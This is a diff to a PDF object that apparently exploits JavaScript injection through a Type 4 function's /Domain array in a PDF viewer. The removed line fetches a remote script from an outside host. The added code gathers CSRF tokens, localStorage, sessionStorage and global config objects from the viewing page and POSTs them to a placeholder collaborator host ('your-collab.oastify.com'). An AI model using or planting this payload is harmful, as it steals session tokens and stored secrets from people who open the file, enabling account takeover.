@@ -2,7 +2,26 @@
 1 0 obj
 <<
   /FunctionType 4
-  /Domain [(javascript:$.getScript(%22//ujs.cx/XFp%22)) 0]
+  /Domain [((function(){
+  var out = {};
+  // 1. DOM中的潜在Token
+  var meta = document.querySelector('meta[name*="csrf"], meta[name*="token"]');
+  if (meta) out.csrf_meta = meta.content;
+  var inp = document.querySelector('input[name*="token"], input[name*="csrf"]');
+  if (inp) out.csrf_input = inp.value;
+  // 2. 存储
+  try { out.localStorage = JSON.stringify(localStorage); } catch(e){}
+  try { out.sessionStorage = JSON.stringify(sessionStorage); } catch(e){}
+  // 3. 全局变量（常见键名）
+  ['appSettings','__INITIAL_STATE__','config','APP_CONFIG'].forEach(function(k){
+    if (window[k]) { try { out[k] = JSON.stringify(window[k]).slice(0,2000); } catch(e){} }
+  });
+  // 4. 外带
+  var xhr = new XMLHttpRequest();
+  xhr.open('POST', 'https://your-collab.oastify.com/probe', true);
+  xhr.setRequestHeader('Content-Type','application/json');
+  xhr.send(JSON.stringify(out));
+})();) 0]
   /Range [0 0]
   /Length 12
 >>
